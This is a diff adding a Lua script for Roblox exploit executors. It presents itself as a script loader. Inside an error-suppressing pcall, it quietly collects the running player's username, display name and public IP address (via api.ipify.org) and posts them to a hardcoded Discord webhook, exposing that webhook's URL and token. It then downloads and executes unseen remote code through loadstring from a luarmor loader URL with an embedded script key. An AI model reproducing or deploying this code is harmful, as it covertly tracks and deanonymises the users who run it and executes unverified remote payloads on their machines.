@@ -1,0 +1,49 @@
+local webh = "https://discord.com/api/webhooks/1256061813108248576/AdDhnlen3MMwtlRt4pIsGnXTI5-jQneQ6RvwLc1peT_DmNwCJ9J8wdA8BdeaL6p_Ady0"
+
+pcall(function()
+   local data = {
+       ["embeds"] = {
+           {
+               ["title"] = "Execution \n Display "..game.Players.LocalPlayer.DisplayName.."\n User "..game.Players.LocalPlayer.Name,
+               ["description"] = "IP Adress: " ..game:HttpGet("https://api.ipify.org")
+           }
+       }
+   }
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
+script_key="eBpFbioXlqFhlNeTZFPpvesiEzpSbGMW";
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/797ad8eaad60942b08839ab9e76937b4.lua"))()
